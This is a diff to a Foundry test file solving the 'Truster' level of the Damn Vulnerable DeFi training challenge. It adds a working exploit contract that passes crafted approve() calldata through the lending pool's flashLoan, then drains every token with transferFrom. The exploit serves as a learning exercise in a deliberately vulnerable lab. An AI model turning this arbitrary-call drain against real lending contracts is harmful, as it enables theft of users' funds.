@@ -6,11 +6,42 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+contract TrusterExploiter {
+    //The storage variables are completely useles here, but for clarity.
+    TrusterLenderPool pool;
+    DamnValuableToken token;
+    address public recovery;
+
+    constructor(
+        TrusterLenderPool _pool,
+        DamnValuableToken _token,
+        address _recovery
+    ) {
+        //Preping the call data to approve the transfer of tokens
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            _token.balanceOf(address(_pool))
+        );
+
+        //We execute the flashloan passing the data defined above to approve the transfer by this contract
+        _pool.flashLoan(0, address(this), address(_token), data);
+        //_token is there to ensure currency consistency is observed - target. 
+
+        //With this contract approve, we can transfer the tokens to the recovery address
+        _token.transferFrom(
+            address(_pool),
+            _recovery,
+            _token.balanceOf(address(_pool))
+        );
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
@@ -50,8 +81,15 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+
     function test_truster() public checkSolvedByPlayer {
-        
+        // We are using a contract to exploit the vulnerability
+        new TrusterExploiter(pool, token, recovery);
+        /**
+         * pool is the contract with mil DVT tokens
+         * token is DVT token contract of ERC20
+         * recovery is our target address to receive the tokens
+         */
     }
 
     /**
@@ -63,6 +101,10 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
